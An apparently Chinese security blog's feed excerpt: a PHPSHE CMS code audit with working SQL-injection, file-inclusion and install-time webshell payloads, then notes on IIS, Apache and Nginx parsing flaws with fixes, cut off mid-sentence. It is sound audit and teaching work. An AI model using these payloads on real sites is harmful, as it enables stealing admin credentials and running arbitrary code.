    <updated>2020-04-09T01:10:10.796Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这套cms比较简单，没有用mvc，一些漏洞点比较简单，里面也有一些很有意思的漏洞点，适合记录一下。</p><a id="more"></a><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>按照功能点进行审计，是比较适合我的审计方法。先从源码网站上下载下来cms，看一下目录结构比较简单。</p><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png" class title="Da4er"><p>将重要的目录展开来：</p><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png" class title="Da4er"><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png" class title="Da4er"><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4.png" class title="Da4er"><p>所以本次审计我们就从前台和后台的功能点入手，进行分析。</p><h3 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h3><p><strong>index.php入口文件</strong></p><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png" class title="Da4er"><p>先跟进common文件查看一下路由：</p><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png" class title="Da4er"><p>发现这个路由参数都没进行过滤，所以在index.php中就有一处文件包含漏洞，图中已经说明。<br>漏洞点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;&#123;$pe[&#39;path_root&#39;]&#125;module&#x2F;&#123;$module&#125;&#x2F;&#123;$mod&#125;.php&quot;);</span><br></pre></td></tr></table></figure><p>$mod参数可控，当我们post传参进来时候没有进行过滤，造成文件包含漏洞。<br>发现限制了后缀必须为.php，如果PHP版本&lt;5.3.4存在%00截断问题。<br>利用payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mod&#x3D;..&#x2F;..&#x2F;robots.txt%00</span><br></pre></td></tr></table></figure><p><strong>模型的index.php文件</strong></p><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7.png" class title="Da4er"><p>前台的默认页面，没有用户传参，只是默认展示页面，参数都写死了，没什么好分析的<br><strong>article.php</strong><br>文章处理文件<br>使用switch case语句进行文章不同功能的展示。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'list'</span>:</span><br><span class="line">        $class_id = intval($id);</span><br><span class="line">        $info_list = $db-&gt;pe_selectall(<span class="string">'article'</span>, <span class="keyword">array</span>(<span class="string">'class_id'</span>=&gt;$class_id, <span class="string">'order by'</span>=&gt;<span class="string">'`article_atime` desc'</span>), <span class="string">'*'</span>, <span class="keyword">array</span>(<span class="number">20</span>, $_g_page));</span><br></pre></td></tr></table></figure><p>传入的id被强制转换为整型，虽然没有过滤，但是无法进行sql注入<br>$<em>g</em>page最后被传入到limt中用来限制显示的条数，$limit = ($this-&gt;page($<em>g</em>page) - 1) * $this-&gt;listnum;return “ limit {$limit}, {$this-&gt;listnum}”; 无法利用</p><p><strong>order.php</strong><br>购物车商品处理文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'cartadd'</span>:</span><br><span class="line">        $info[<span class="string">'cart_atime'</span>] = time();</span><br><span class="line">        <span class="comment">//被强制转为整型不存在注入</span></span><br><span class="line">        $info[<span class="string">'product_id'</span>] = intval($_g_product_id);</span><br><span class="line">        $info[<span class="string">'product_num'</span>] = intval($_g_product_num);</span><br><span class="line">        $product = $db-&gt;pe_select(<span class="string">'product'</span>, <span class="keyword">array</span>(<span class="string">'product_id'</span>=&gt;$info[<span class="string">'product_id'</span>]), <span class="string">'`product_num`'</span>);</span><br><span class="line">        <span class="keyword">if</span> ($product[<span class="string">'product_num'</span>] &gt;= $info[<span class="string">'product_num'</span>]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pe_login(<span class="string">'user'</span>)) &#123;</span><br><span class="line">                <span class="comment">//$_s_user_id是没有经过过滤的，在低版本php如果没有开gpc，存在sql注入</span></span><br><span class="line">                <span class="comment">//最后形成的sql注入为:select * from cart where product_id=&#123;$info['product_id']&#125; and user_id=$_s_user_id(注入点)</span></span><br><span class="line">                $info[<span class="string">'user_id'</span>] = $_s_user_id; </span><br><span class="line">                $cart = $db-&gt;pe_select(<span class="string">'cart'</span>, <span class="keyword">array</span>(<span class="string">'product_id'</span>=&gt;$info[<span class="string">'product_id'</span>], <span class="string">'user_id'</span>=&gt;$_s_user_id));</span><br></pre></td></tr></table></figure><p>我们发现$<em>g</em>product_id和$<em>g</em>product_num都强制转换成整型，但是$<em>s</em>user_id没有转换，而且不存在过滤，导致sql注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'cartnum'</span>:</span><br><span class="line">    $money[<span class="string">'order_productmoney'</span>] = $money[<span class="string">'order_wlmoney'</span>] = $money[<span class="string">'order_money'</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (pe_login(<span class="string">'user'</span>)) &#123;</span><br><span class="line">        <span class="comment">//$_s_user_id和$_g_product_num都没过滤，导致sql注入 和上面的注入一样</span></span><br><span class="line">        <span class="comment">//解决方法最简单的就是使用intval函数强制转换一下</span></span><br><span class="line">        $result = $db-&gt;pe_update(<span class="string">'cart'</span>, <span class="keyword">array</span>(<span class="string">'user_id'</span>=&gt;$_s_user_id, <span class="string">'product_id'</span>=&gt;$_g_product_id), <span class="keyword">array</span>(<span class="string">'product_num'</span>=&gt;$_g_product_num));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>cartnum功能点也存在sql注入，$<em>s</em>user_id和$<em>g</em>product_num都没过滤，导致sql注入 和上面的注入一样。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'cartdel'</span>:</span><br><span class="line">        $money[<span class="string">'order_productmoney'</span>] = $money[<span class="string">'order_wlmoney'</span>] = $money[<span class="string">'order_money'</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (pe_login(<span class="string">'user'</span>)) &#123;</span><br><span class="line">            <span class="comment">//故技重施还是存在sql注入问题 $_s_user_id没有过滤</span></span><br><span class="line">            $result = $db-&gt;pe_delete(<span class="string">'cart'</span>, <span class="keyword">array</span>(<span class="string">'user_id'</span>=&gt;$_s_user_id, <span class="string">'product_id'</span>=&gt;$_g_product_id));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>同样的sql注入2333….</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">'add'</span>:</span><br><span class="line">        $cart_info = cart_info(unserialize($_c_cart_list));</span><br></pre></td></tr></table></figure><p>这个漏洞点应该说整套cms最有意思的一个漏洞点，我们来好好分析一下。</p><p>跟进这个函数：</p><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/8.png" class title="Da4er"><p>首先这个函数判断了一下用户的权限，如果权限够大直接查询user的所有数据。<br>如果不够大，就到了我们的漏洞点。经过分析发现$k是没有经过过滤的，直接带入sql语句中查询，从而造成sql注入漏洞，需要注意的是这个漏洞点<strong>出现的位置是数组的键名，而不是键值。</strong></p><p>所以我们写一个poc先序列化一下，然后再cookie中传入payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">poc.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b[<span class="string">"'union select admin_name,2,3,4 from pe_admin -- -"</span>][<span class="number">0</span>] = <span class="string">'1\''</span>;</span><br><span class="line">$b[<span class="string">"'union select admin_pw,2,3,4 from pe_admin -- -"</span>][<span class="number">1</span>] = <span class="string">'1\''</span>;</span><br><span class="line">$s = serialize($b);</span><br><span class="line">print_r($s);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:49:&quot;&#39;union select admin_name,2,3,4 from pe_admin -- -&quot;;a:1 &#123;i:0;s:2:&quot;v&#39;&quot;;&#125;s:47:&quot;&#39;union select admin_pw,2,3,4 from pe_admin -- -&quot;;a:1:&#123;i:1;s:2:&quot;v&#39;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>用这条payload就可以查询管理员的账号和密码。<br>进行看add这个功能点，再87~99行又出现了sql注入漏洞，和前面的注入漏洞基本类似。这次$<em>s</em>user_id和$<em>s</em>user_name没有进行过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$_p_info[<span class="string">'user_id'</span>] = $_s_user_id;</span><br><span class="line">            $_p_info[<span class="string">'user_name'</span>] = $_s_user_name;</span><br><span class="line">            $_p_info[<span class="string">'user_address'</span>] = <span class="string">"&#123;$_p_province&#125;&#123;$_p_city&#125;&#123;$_p_info['user_address']&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> ($order_id = $db-&gt;pe_insert(<span class="string">'order'</span>, $_p_info)) &#123;</span><br><span class="line">                <span class="keyword">foreach</span> ($info_list <span class="keyword">as</span> $v) &#123;</span><br><span class="line">                    $orderdata[<span class="string">'product_id'</span>] = $v[<span class="string">'product_id'</span>];</span><br><span class="line">                    $orderdata[<span class="string">'product_name'</span>] = $v[<span class="string">'product_name'</span>];</span><br><span class="line">                    $orderdata[<span class="string">'product_smoney'</span>] = $v[<span class="string">'product_smoney'</span>];</span><br><span class="line">                    $orderdata[<span class="string">'product_num'</span>] = $v[<span class="string">'product_num'</span>];</span><br><span class="line">                    $orderdata[<span class="string">'order_id'</span>] = $order_id;</span><br><span class="line">                    $db-&gt;pe_insert(<span class="string">'orderdata'</span>, $orderdata);</span><br><span class="line">                    <span class="comment">//更新商品库存数量</span></span><br><span class="line">                    $db-&gt;pe_update(<span class="string">'product'</span>, <span class="keyword">array</span>(<span class="string">'product_id'</span>=&gt;$v[<span class="string">'product_id'</span>]), <span class="string">"`product_num`=`product_num`-&#123;$v['product_num']&#125;"</span>);</span><br></pre></td></tr></table></figure><p>order文件最后一个功能点:pay(选择支付方式)<br>出现文件包含漏洞</p><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/9.png" class title="Da4er"><p><strong>page.php</strong><br>传入参数太少，$act被强制转换，没有可以利用的点。</p><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/10.png" class title="Da4er"><p><strong>product.php</strong><br>在第12~13行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$info[&#39;user_ip&#39;] &#x3D; pe_ip();</span><br></pre></td></tr></table></figure><p>跟进pe_ip()后发现这个获取ip地址的函数</p><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/11.png" class title="Da4er"><p>没有经过任何的过滤，存在XXF头注入。<br>第95行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_g_keyword &amp;&amp; $sqlwhere .&#x3D; &quot; and &#96;product_name&#96; like &#39;%&#123;$_g_keyword&#125;%&#39;&quot;;</span><br></pre></td></tr></table></figure><p>可以看到$<em>g</em>keyword没有经过过滤，直接拼接到sql语句中，导致搜索型注入漏洞。</p><p><strong>user.php</strong><br>这个页面存在很多sql注入漏洞，都和前面的sql注入产生原因一样，这里不在叙述。<br>第13行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($info &#x3D; $db-&gt;pe_select(&#39;user&#39;, $_p_info))</span><br></pre></td></tr></table></figure><p>判断数据是否存在，这里存在逻辑错误，可以使用万能密码绕过，同样有返回值。<br>在这个页面中还有一个pe_dbhold()函数，我们跟进去看</p><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/12.png" class title="Da4er"><p>说是数据库安全，<strong>我们经过分析发现数组的键值是不存在sql注入的，但是键名还是没有过滤，同样会导致sql注入。</strong></p><p>以上就是前台的代码分析</p><hr><p>后台代码量比较大，而且出现的漏洞和前台都是一样的原理，都是sql注入居多。</p><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/13.png" class title="Da4er"><p>我们只看install.php页面存在的一个任意代码执行漏洞。</p><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/14.png" class title="Da4er"><p>我们看到这个$<em>p</em>dbpre变量是没有经过过滤的，这就导致webshell到config.php中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;install&#x2F;install.php?step&#x3D;setting</span><br><span class="line"></span><br><span class="line">pesubmit&#x3D;1&amp;dbpre&#x3D;&#39;);eval($_POST[1]);&#x2F;&#x2F;&amp;.....</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这套cms还是sql注入居多，有些意思的漏洞点有几个：install中的任意代码执行，pe_dbhold()函数检查问题，还有前台的order页面存在的一个cookie反序列化sql注入问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;这套cms比较简单，没有用mvc，一些漏洞点比较简单，里面也有一些很有意思的漏洞点，适合记录一下。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Web中间件漏洞笔记(持续更新....)</title>
    <link href="https://da4er.top/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-04-08T10:08:21.000Z</published>
    <updated>2020-04-08T10:10:50.101Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><h4 id="IIS文件解析漏洞"><a href="#IIS文件解析漏洞" class="headerlink" title="IIS文件解析漏洞"></a>IIS文件解析漏洞</h4><p>IIS文件解析漏洞存在于两个版本，一个是IIS6.0的文件解析漏洞，一个是IIS7.5的文件解析漏洞，IIS7.5的文件解析漏洞原理和IIS6.0类似，均因为存在逻辑问题。</p><a id="more"></a><h5 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h5><p>一.漏洞原理<br>IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误（文件目录名称为test.asp，目录中的文件会被当做asp执行；后缀名为.asp;.jpg时，当作asp文件执行），从而造成文件解析漏洞。<br>二.漏洞演示<br>现在iis服务器上写入一个<strong>1.asp;.jpg</strong></p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="This is an test image"><p>然后访问发现成功解析</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="This is an test image"><p>在服务器上创建一个1.asp目录，里面写入asp文件</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="This is an test image"><p>访问发现成功解析</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="This is an test image"><p>三.漏洞修复<br>1.对新建目录文件名进行过滤，不允许新建包含.的文件夹甚至禁止新建目录<br>2.限制上传文件的执行权限，不允许执行<br>3.过滤.asp/xm.jpg等，在httpd.ini中加入过滤规则（此方法为网络上的解决办法，但在server2003中未搜索到该文件）。<br>4.升级IIS版本</p><h5 id="IIS7-5解析漏洞"><a href="#IIS7-5解析漏洞" class="headerlink" title="IIS7.5解析漏洞"></a>IIS7.5解析漏洞</h5><p><strong>IIS6.0的解析漏洞同样存在于IIS 5.x的版本，而IIS7.5的畸形解析漏洞的攻击方法同样适用于IIS7.0和Nginx&lt;8.037版本。</strong><br>IIS7.5文件解析漏洞出现是因为url中只要看到后缀.php，无论存在与否均交给php处理，而php又默认开启“cgi.fix_pathinfo”,会对文件路径进行整理（<strong>从后向前判定是否存在，不存在则删减，存在则当作php文件执行</strong>。）</p><p>在Fast-CGI开启状态下，<strong>在文件路径后加上 /xx.php ，即 xx.jpg/xx.php 会被解析为php文件</strong>。</p><h4 id="IIS命令执行漏洞"><a href="#IIS命令执行漏洞" class="headerlink" title="IIS命令执行漏洞"></a>IIS命令执行漏洞</h4><p>IIS6.0命令执行漏洞，在开启WebDav服务器的情况下存在可远程执行漏洞。<br>一.漏洞原理<br>在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，该漏洞可以导致远程代码执行。</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="This is an test image"><p>二.漏洞复现<br>Github上的一个开源exp: <a href="https://github.com/edwardz246003/IIS_exploit">https://github.com/edwardz246003/IIS_exploit</a><br>修改IP地址未对应的目标机地址</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="This is an test image"><p>但是我没有复现成功23333…<br>三.漏洞修复<br>将IIS管理器中，web服务器扩展下，webDAV禁用，即可修复，修复后再此运行脚本，未出现弹框。</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="This is an test image"><h4 id="IIS短文件名"><a href="#IIS短文件名" class="headerlink" title="IIS短文件名"></a>IIS短文件名</h4><p>参考博客：<a href="https://xz.aliyun.com/t/2318">利用windows特性猜解文件名</a><br>IIS短文件名漏洞，通过IIS短文件名机制，暴力列举短文件名，尝试猜解后台地址、敏感文件甚至直接下载对应的文件。但局限于只能猜解<strong>长文件名前6位和扩展名前3位</strong>，同时<strong>需要IIS和.net两个条件都满足</strong>。<br>一.漏洞原理<br>利用了IIS短文件名机制，即为了兼容16位MS-DOS程序，<strong>Windows为文件名较长的（计算后缀后文件名长度大于9）文件（和文件夹）生成了对应的windows 8.3 短文件名</strong>。可以通过此漏洞猜解后台地址、敏感文件等。</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" class title="This is an test image"><p>二.漏洞复现<br>尝试10.10.10.132/122<del>1**/a.asp和10.10.10.132/123</del>1/a.asp；得到不同的结果</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" class title="This is an test image"><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/10.png" class title="This is an test image"><p>根据不同的回显我们可以判断正在猜解的对象是文件还是文件夹。<br>三.漏洞修复<br>目前几种修复方式，可选择升级.net framework或者将在注册表<br>HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlFileSystem中修改NtfsDisable8dot3NameCreation为1，但修改方法尝试多次，不易成功。<br><strong>除去上述方式，较易成功的方式为将web文件夹内容拷贝到其他区域，将原文件夹删除后，再将拷贝的文件夹移动回来</strong></p><h4 id="IIS6-0PUT上传任意文件"><a href="#IIS6-0PUT上传任意文件" class="headerlink" title="IIS6.0PUT上传任意文件"></a>IIS6.0PUT上传任意文件</h4><p>一.漏洞要求：<br>1.IIS在Web服务扩展中开启了WebDAV。<br>2.IIS配置了可以写入的权限，包括网站。</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/11.png" class title="This is an test image"><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/12.png" class title="This is an test image"><p>二.漏洞复现<br>利用burp测试<br>1.随便请求一个页面，将GET方法改成OPTIONS后测试</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/13.png" class title="This is an test image"><p>2.利用PUT方法上传一句话<br>参考博客：<a href="https://blog.csdn.net/nzjdsds/article/details/96431844">https://blog.csdn.net/nzjdsds/article/details/96431844</a><br>三.漏洞修补<br>关闭WebDAV和写权限。</p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><h4 id="文件解析问题"><a href="#文件解析问题" class="headerlink" title="文件解析问题"></a>文件解析问题</h4><p>文件解析漏洞通常和文件上传漏洞密不可分。<br>一.漏洞原理<br>因为apache解析php时，当文件的最后一个后缀php相关时，会把文件交给php处理器处理，完成结果后返回给apache，再发送给浏览器。而当一个文件以多个点分隔无法识别时，则继续向左识别。<br>例如：<br>我们上传一个1.php.aaa.x2<br>由于我们不能识别x2,aaa，Apache会从左向右判断，所以这个文件会识别成php文件执行。</p><p>二.漏洞修复<br>在配置文件中，不使用AddHandler，改用SetHandler，写好正则，就不会有解析问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch “.+.php$”&gt; </span><br><span class="line">SetHandler application &#x2F;x-httpd-php </span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch “.+.ph(p[3457]?|t|tml).”&gt; </span><br><span class="line">Require all denied </span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><h4 id="AddHandler导致的解析漏洞"><a href="#AddHandler导致的解析漏洞" class="headerlink" title="AddHandler导致的解析漏洞"></a>AddHandler导致的解析漏洞</h4><p>一般这个漏洞不会出现。<br>一.漏洞原理<br>如果运维人员给.php后缀增加了处理器：AddHandler application/x-httpd-php .php那么，在有多个后缀的情况下，只要<strong>一个文件名中含有.php后缀，即被识别成PHP文件，没必要是最后一个后缀</strong>。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。<br>二.漏洞复现<br>我们可以上传1.php.jpg，因为文件名中存在php，所以这个文件会被解析成php文件，而不是jpg文件。</p><h4 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h4><p>影响范围：2.4.0~2.4.29版本<br>一.漏洞原理<br>CRLF漏洞，根本原因就是，$在正则表达式中不仅可以匹配字符串结尾位置，也可以匹配\n或\r。所以，如果服务器写入如下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;    </span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>所以我们可以上传1.php\x0A将按照php后缀进行解析，导致绕过一些服务器安全策略。<br>二.复现<br>这个漏洞只能在Linux下使用，因为1.php\x0A文件名在windows不合法，不会创建的。<br>三.漏洞修复<br>1.升级到最新版本。<br>2.或将上传的文件重命名为为时间戳+随机数+.jpg的格式并禁用上传文件目录执行脚本权限。</p><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><h4 id="Nginx配置文件错误导致的解析漏洞"><a href="#Nginx配置文件错误导致的解析漏洞" class="headerlink" title="Nginx配置文件错误导致的解析漏洞"></a>Nginx配置文件错误导致的解析漏洞</h4><p>Nginx的解析漏洞说白了就是PHP的解析漏洞，只是这个漏洞在Nginx上出现的比较多。<br>一.漏洞原理<br>涉及到的选项cgi.fix_pathinfo，默认值为1，表示开启。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        root           &#x2F;work&#x2F;www&#x2F;test;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME    </span><br><span class="line">  $document_root$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">        fastcgi_pass   unix:&#x2F;tmp&#x2F;php-fpm.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当攻击者访问/info.jpg/xxx.php时， Nginx将查看URL，看到它以.php结尾，并将路径传递给PHP fastcgi处理程序。<br>PHP根据URL映射，在服务器上寻找xxx.php文件，但是<strong>xxx.php不存在</strong>，又由于cgi.fix_pathinfo默认是开启的，因此PHP 会继续检查路径中存在的文件，并将多余的部分当作 PATH_INFO。接着PHP在文件系统中找到.jpg文件，<strong>而后以PHP的形式执行.jpg的内容。</strong><br>这个漏洞和Ngnix版本没有关系。<br>二.漏洞修补<br>1将cgi.fix_pathinfo设置成0。<br>2如果需要使用到cgi.fix_pathinfo这个特性（例如：Wordpress），那么可以禁止上传目录的执行脚本权限。<br>3或将上传存储的内容与网站分离，即站库分离。<br>4或高版本PHP提供了security.limit_extensions这个配置参数，设置security.limit_extensions = .php</p><h4 id="Nginx空字节任意代码执行漏洞"><a href="#Nginx空字节任意代码执行漏洞" class="headerlink" title="Nginx空字节任意代码执行漏洞"></a>Nginx空字节任意代码执行漏洞</h4><p>影响版本：Nginx 0.5<em>, 0.6</em>,0.7 &lt;= 0.7.65,0.8 &lt;= 